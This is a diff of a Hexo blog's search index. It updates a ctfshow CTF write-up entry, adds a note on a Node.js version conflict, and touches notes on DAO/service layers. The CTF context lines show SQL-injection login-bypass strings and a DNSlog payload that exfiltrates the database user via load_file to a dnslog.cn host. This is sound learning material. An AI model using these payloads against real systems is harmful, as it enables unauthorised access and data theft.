@@ -2544,11 +2544,9 @@ return $outText;#新值
       </tags>
   </entry>
   <entry>
-    <title></title>
-    <url>/2023/06/26/ctfshow/</url>
-    <content><![CDATA[<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">title: ctfshow</span><br><span class="line">categories: </span><br><span class="line">- ctfshow</span><br><span class="line">date: 2023-06-28 9:12:30</span><br><span class="line">tags: </span><br><span class="line">- ctfshow</span><br></pre></td></tr></table></figure>
-
-<h1 id="1-登录框"><a href="#1-登录框" class="headerlink" title="1.登录框"></a>1.登录框</h1><h2 id="1-web6"><a href="#1-web6" class="headerlink" title="1.web6"></a>1.web6</h2><p><code>常见的&#39; or 1=1#</code>会被检测到</p>
+    <title>ctfshow</title>
+    <url>/2023/06/28/ctfshow/</url>
+    <content><![CDATA[<h1 id="1-登录框"><a href="#1-登录框" class="headerlink" title="1.登录框"></a>1.登录框</h1><h2 id="1-web6"><a href="#1-web6" class="headerlink" title="1.web6"></a>1.web6</h2><p><code>常见的&#39; or 1=1#</code>会被检测到</p>
 <p>遍历了一下万能密码库，发现</p>
 <p><code>&#39;or&#39;&#39;=&#39;&#39;or&#39;&#39;=&#39;</code>是可以的</p>
 <p>其实经过尝试方法，<strong>过滤了or+空格的形式</strong></p>
@@ -2682,6 +2680,12 @@ return $outText;#新值
 <p><code>highlight_file(&quot;903c00105c0141fd37ff47697e916e53616e33a72fb3774ab213b3e2a732f56f.php&quot;);</code></p>
 <h1 id="Dnslog注入"><a href="#Dnslog注入" class="headerlink" title="Dnslog注入"></a>Dnslog注入</h1><p>(select load_file(concat(‘\\\\‘,(select hex(user())),’.rihjsd.dnslog.cn&#x2F;abc’)))</p>
 <h2 id=""><a href="#" class="headerlink" title=""></a></h2>]]></content>
+      <categories>
+        <category>ctfshow</category>
+      </categories>
+      <tags>
+        <tag>ctfshow</tag>
+      </tags>
   </entry>
   <entry>
     <title>git bash</title>
@@ -2777,6 +2781,10 @@ return $outText;#新值
 <h2 id="解决方案："><a href="#解决方案：" class="headerlink" title="解决方案："></a>解决方案：</h2><p><strong>反斜杠漏了啊</strong></p>
 <p>​	alias  D:&#x2F;phpstudy_pro&#x2F;WWW&#x2F;sqli<code>/</code>; 不要丢最后一个反斜杠</p>
 <p><img src="/../../../Typora/img111/image-20230819123728492.png"></p>
+<h2 id="四、nodejs的冲突"><a href="#四、nodejs的冲突" class="headerlink" title="四、nodejs的冲突"></a>四、nodejs的冲突</h2><p>开发设计的时候要求node版本16.17</p>
+<p>当时配置hexo的是v18.</p>
+<p>使用旧版本的nodejs导致了hexo进行博客更新出问题，G!!!!</p>
+<h2 id="解决方案-1"><a href="#解决方案-1" class="headerlink" title="解决方案"></a>解决方案</h2><p>更新博客用新的，设计时用旧的</p>
 <h1 id="知识点"><a href="#知识点" class="headerlink" title="知识点"></a>知识点</h1><h2 id="DAO-x2F-ENTITY-x2F-SERVICE-x2F-CONTROLLER"><a href="#DAO-x2F-ENTITY-x2F-SERVICE-x2F-CONTROLLER" class="headerlink" title="DAO&#x2F;ENTITY&#x2F;SERVICE&#x2F;CONTROLLER"></a>DAO&#x2F;ENTITY&#x2F;SERVICE&#x2F;CONTROLLER</h2><p>1、DAO层： 持久层 主要与数据库进行交互</p>
 <p>DAO层主要是做数据持久层的工作，主要与数据库进行交互。</p>
 <p>DAO层首先会创建DAO接口，接着就可以在模块中就可以调用DAO 的接口进行数据业务的而处理，并且不用关注此接口的具体实现类是哪一个类。DAO 层的数据源和数据库连接的参数都是在配置文件中进行配置的。</p>
